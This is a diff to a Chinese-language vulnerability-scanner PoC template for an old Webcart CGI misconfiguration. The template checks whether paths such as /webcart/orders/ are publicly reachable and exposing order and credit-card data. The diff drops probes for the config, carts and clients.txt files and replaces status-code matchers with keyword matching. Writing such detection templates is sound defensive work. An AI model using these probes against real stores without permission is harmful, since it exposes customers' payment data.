@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "检测 Webcart CGI 默认安装下敏感目录和文件是否可公开访问，包括 /webcart/orders/、/webcart/config/、/webcart/carts/ 等路径。若可访问则可能泄露用户订单、信用卡号等敏感信息。"
+author = "AVE"
+description = "检测 Webcart CGI 程序是否因配置不当导致 /webcart/orders/ 目录可被公开访问，从而泄露订单及信用卡等敏感信息"
 id = "POC-AVE-1999-0183"
-name = "Webcart CGI 配置不当信息泄露 PoC"
+name = "Webcart CGI 配置不当信息泄露漏洞 PoC"
 severity = "medium"
 tags = ["ave-1999-0183"]
 vuln_id = [
@@ -20,67 +20,13 @@ protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    301,
-    302,
+part = "body"
+type = "word"
+words = [
+    "Order",
+    "order",
+    "Total",
+    "total",
+    "Credit",
+    "credit",
 ]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/webcart/config/"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    200,
-    301,
-    302,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/webcart/carts/"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    200,
-    301,
-    302,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/webcart/config/clients.txt"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/webcart-lite/config/clients.txt"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/webcart-lite/orders/import.txt"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
